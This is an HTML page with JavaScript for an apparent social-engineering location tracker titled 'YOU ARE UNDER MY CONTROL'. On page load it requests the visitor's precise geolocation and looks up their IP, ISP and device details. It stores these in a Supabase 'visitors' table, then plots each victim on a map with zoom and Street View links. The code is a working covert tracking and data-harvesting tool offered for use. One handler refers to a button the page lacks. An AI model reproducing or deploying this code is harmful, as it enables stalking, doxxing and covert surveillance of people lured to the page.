<!DOCTYPE html>
<html>
<head>
    <title>YOU ARE UNDER MY CONTROL</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    
    <!-- Leaflet CSS and JS -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
          integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY="
          crossorigin=""/>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
            integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo="
            crossorigin=""></script>
    
    <!-- Supabase -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

    <style>
        body {
            margin: 0;
            padding: 20px;
            background-color: #000000;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            background-image: 
                linear-gradient(rgba(0, 0, 0, 0.9), rgba(0, 0, 0, 0.9)),
                repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(255, 0, 0, 0.1) 2px, rgba(255, 0, 0, 0.1) 4px);
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        h1 {
            color: #ff0000;
            font-size: 2.5em;
            text-align: center;
            margin-bottom: 20px;
            text-shadow: 0 0 10px #ff0000;
            letter-spacing: 3px;
            animation: glitch 2s infinite;
        }

        .subtitle {
            color: #ff0000;
            text-align: center;
            font-size: 1em;
            margin-bottom: 30px;
            text-shadow: 0 0 5px #ff0000;
            letter-spacing: 1px;
        }

        #map {
            height: 70vh;
            width: 100%;
            border: 2px solid #ff0000;
            margin-bottom: 20px;
            background: #000000;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
        }

        .map-modes {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin: 15px 0;
        }

        .map-mode-button {
            background-color: #000000;
            color: #ff0000;
            border: 1px solid #ff0000;
            padding: 8px 15px;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-shadow: 0 0 5px #ff0000;
            letter-spacing: 1px;
        }

        .map-mode-button:hover {
            background-color: #ff0000;
            color: #000000;
            box-shadow: 0 0 15px #ff0000;
        }

        .visitor-table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
            margin-top: 20px;
            font-size: 12px;
        }

        .visitor-table th, .visitor-table td {
            border: 1px solid #ff0000;
            padding: 10px;
            text-align: left;
        }

        .visitor-table th {
            background-color: rgba(255, 0, 0, 0.1);
            color: #ff0000;
            text-shadow: 0 0 5px #ff0000;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .visitor-table tr:hover {
            background-color: rgba(255, 0, 0, 0.05);
        }

        /* Custom map styles */
        .leaflet-container {
            background: #000000 !important;
        }

        .leaflet-control-layers,
        .leaflet-control-zoom {
            background: #000000 !important;
            border: 1px solid #ff0000 !important;
            color: #ff0000 !important;
        }

        .leaflet-control-zoom a {
            color: #ff0000 !important;
            text-shadow: 0 0 5px #ff0000;
        }

        .leaflet-control-attribution {
            display: none !important;
        }

        #tracking-status {
            font-family: 'Courier New', monospace;
            text-align: center;
            margin: 15px 0;
            min-height: 20px;
            color: #ff0000;
            text-shadow: 0 0 5px #ff0000;
            font-size: 14px;
            letter-spacing: 1px;
        }

        @keyframes glitch {
            0% {
                text-shadow: 0 0 10px #ff0000;
                transform: translate(0);
            }
            20% {
                text-shadow: -3px 0 #ff0000, 3px 0 #ff0000;
                transform: translate(-2px, 2px);
            }
            40% {
                text-shadow: 3px 0 #ff0000, -3px 0 #ff0000;
                transform: translate(2px, -2px);
            }
            60% {
                text-shadow: 0 0 10px #ff0000;
                transform: translate(0);
            }
            100% {
                text-shadow: 0 0 10px #ff0000;
                transform: translate(0);
            }
        }

        /* Scrollbar styling */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: #000000;
        }

        ::-webkit-scrollbar-thumb {
            background: #ff0000;
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #ff3333;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Philippines Cyber Alliance - XYNN</h1>
        <div class="subtitle">PRECISELY PINPOINT SOMEONE'S LOCATION THROUGH THE ART OF SOCIAL ENGINEERING</div>
        
        <div id="tracking-status" style="margin-top: 10px; font-size: 14px;"></div>
        
        <div id="map"></div>

        <div class="map-modes">
            <button class="map-mode-button">LIGHT MODE</button>
            <button class="map-mode-button">DARK MODE</button>
            <button class="map-mode-button">STREET MODE</button>
            <button class="map-mode-button">SATELLITE MODE</button>
            <button class="map-mode-button">HIGH-LOW</button>
        </div>

        <table class="visitor-table">
            <thead>
                <tr>
                    <th>LATITUDE</th>
                    <th>LONGITUDE</th>
                    <th>IP</th>
                    <th>OS</th>
                    <th>BROWSER</th>
                    <th>DEVICE TYPE</th>
                    <th>SCREEN</th>
                    <th>COUNTRY</th>
                    <th>ISP</th>
                    <th>TIME</th>
                    <th>PREVIEW</th>
                    <th>STREET VIEW</th>
                    <th>ZOOM</th>
                </tr>
            </thead>
            <tbody id="visitor-data">
            </tbody>
        </table>
    </div>

    <script type="module">
        import VisitorTracker from './tracker.js';
        
        document.addEventListener('DOMContentLoaded', function() {
            // Initialize map
            const map = L.map('map', {
                center: [12.8797, 121.7740],
                zoom: 6,
                minZoom: 5,
                maxZoom: 18
            });

            // Define map layers
            const layers = {
                'LIGHT MODE': L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}.png', {
                    attribution: 'UNDER MY CONTROL'
                }),
                'DARK MODE': L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}.png', {
                    attribution: 'UNDER MY CONTROL'
                }),
                'STREET MODE': L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: 'UNDER MY CONTROL'
                }),
                'SATELLITE MODE': L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
                    attribution: 'UNDER MY CONTROL'
                }),
                'HIGH-LOW': L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Topo_Map/MapServer/tile/{z}/{y}/{x}', {
                    attribution: 'UNDER MY CONTROL'
                })
            };

            // Set default layer
            layers['DARK MODE'].addTo(map);

            // Add click handlers for map mode buttons
            document.querySelectorAll('.map-mode-button').forEach(button => {
                button.addEventListener('click', (e) => {
                    const mode = e.target.textContent;
                    
                    // Remove current layer
                    map.eachLayer((layer) => {
                        if (layer instanceof L.TileLayer) {
                            map.removeLayer(layer);
                        }
                    });

                    // Add selected layer
                    if (layers[mode]) {
                        layers[mode].addTo(map);
                    }
                });
            });

            // Create tracker instance and pass the map
            const tracker = new VisitorTracker();
            tracker.map = map;  // Share the map instance
            
            // Load initial data
            tracker.fetchVisitors();
            
            // Add click handler for track location button
            document.getElementById('track-location').addEventListener('click', () => {
                tracker.trackVisitor();
            });

            // Custom marker icon
            const customIcon = L.divIcon({
                html: `<div style="
                    background-color: #00ff00;
                    width: 8px;
                    height: 8px;
                    border-radius: 50%;
                    border: 2px solid #ffffff;
                    box-shadow: 0 0 10px rgba(0,255,0,0.5);
                "></div>`,
                className: 'custom-marker',
                iconSize: [12, 12],
                iconAnchor: [6, 6]
            });

            // Add this new function to handle visitor tracking
            async function trackVisitor() {
                console.log('Starting visitor tracking...');
                if ("geolocation" in navigator) {
                    try {
                        navigator.geolocation.getCurrentPosition(async function(position) {
                            console.log('Got position:', position);
                            const lat = position.coords.latitude.toFixed(6);
                            const lng = position.coords.longitude.toFixed(6);

                            try {
                                // Get IP info
                                console.log('Fetching IP info...');
                                const ipResponse = await fetch('https://ipapi.co/json/');
                                const ipData = await ipResponse.json();
                                console.log('IP data:', ipData);

                                // Get device info
                                const deviceInfo = {
                                    os: navigator.platform,
                                    browser: navigator.userAgent,
                                    deviceType: /Mobile|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                                    screen: `${window.screen.width}x${window.screen.height}`
                                };
                                console.log('Device info:', deviceInfo);

                                // Save to Supabase
                                console.log('Saving to Supabase...');
                                const { data, error } = await tracker.supabase
                                    .from('visitors')
                                    .insert([{
                                        latitude: lat,
                                        longitude: lng,
                                        ip_address: ipData.ip,
                                        country: ipData.country_name,
                                        isp: ipData.org,
                                        os: deviceInfo.os,
                                        browser: deviceInfo.browser,
                                        device_type: deviceInfo.deviceType,
                                        screen_resolution: deviceInfo.screen,
                                        visit_time: new Date().toISOString()
                                    }]);

                                if (error) throw error;

                                // Add marker to map
                                const marker = L.marker([lat, lng], {icon: customIcon}).addTo(map);
                                marker.bindPopup(`
                                    <div style="color: #00ff00; background: #000; padding: 5px;">
                                        <strong>Location:</strong> ${lat}, ${lng}<br>
                                        <strong>IP:</strong> ${ipData.ip}<br>
                                        <strong>Country:</strong> ${ipData.country_name}<br>
                                        <strong>ISP:</strong> ${ipData.org}
                                    </div>
                                `);

                                // Refresh visitor table
                                tracker.fetchVisitors();
                            } catch (error) {
                                console.error('Error tracking visitor:', error);
                            }
                        });
                    } catch (error) {
                        console.error('Error tracking visitor:', error);
                    }
                }
            }

            // Call trackVisitor when page loads
            trackVisitor();

            // Add click handlers for table buttons
            document.getElementById('visitor-data').addEventListener('click', function(e) {
                if (e.target.classList.contains('preview-button')) {
                    const row = e.target.closest('tr');
                    const lat = row.cells[0].textContent;
                    const lng = row.cells[1].textContent;
                    
                    // Use the same custom icon as in tracker.js
                    const customIcon = L.divIcon({
                        html: `
                            <div class="marker-container">
                                <div class="marker-dot">☠️</div>
                                <div class="marker-ripple ripple-1"></div>
                                <div class="marker-ripple ripple-2"></div>
                                <div class="marker-ripple ripple-3"></div>
                            </div>
                            <style>
                                .marker-container {
                                    position: relative;
                                    width: 20px;
                                    height: 20px;
                                    display: flex;
                                    justify-content: center;
                                    align-items: center;
                                }
                                .marker-dot {
                                    position: absolute;
                                    font-size: 20px;
                                    z-index: 1000;
                                }
                                .marker-ripple {
                                    position: absolute;
                                    border: 2px solid #ff0000;
                                    width: 20px;
                                    height: 20px;
                                    border-radius: 50%;
                                    opacity: 0;
                                }
                                .ripple-1 {
                                    animation: ripple 3s infinite ease-out;
                                }
                                .ripple-2 {
                                    animation: ripple 3s infinite ease-out 1s;
                                }
                                .ripple-3 {
                                    animation: ripple 3s infinite ease-out 2s;
                                }
                                @keyframes ripple {
                                    0% {
                                        transform: scale(1);
                                        opacity: 0.8;
                                    }
                                    100% {
                                        transform: scale(2.5);
                                        opacity: 0;
                                    }
                                }
                            </style>`,
                        className: 'custom-marker',
                        iconSize: [20, 20],
                        iconAnchor: [10, 10]
                    });

                    L.marker([lat, lng], {icon: customIcon}).addTo(map);
                    map.setView([lat, lng], 13);
                }
                else if (e.target.classList.contains('zoom-button')) {
                    const row = e.target.closest('tr');
                    const lat = row.cells[0].textContent;
                    const lng = row.cells[1].textContent;
                    
                    // Center map without marker
                    map.setView([lat, lng], 18);
                }
                else if (e.target.classList.contains('street-view-button')) {
                    const row = e.target.closest('tr');
                    const lat = row.cells[0].textContent;
                    const lng = row.cells[1].textContent;
                    
                    // Open Google Street View in new tab
                    window.open(`https://www.google.com/maps?layer=c&cbll=${lat},${lng}`);
                }
            });
        });
    </script>
</body>
</html>
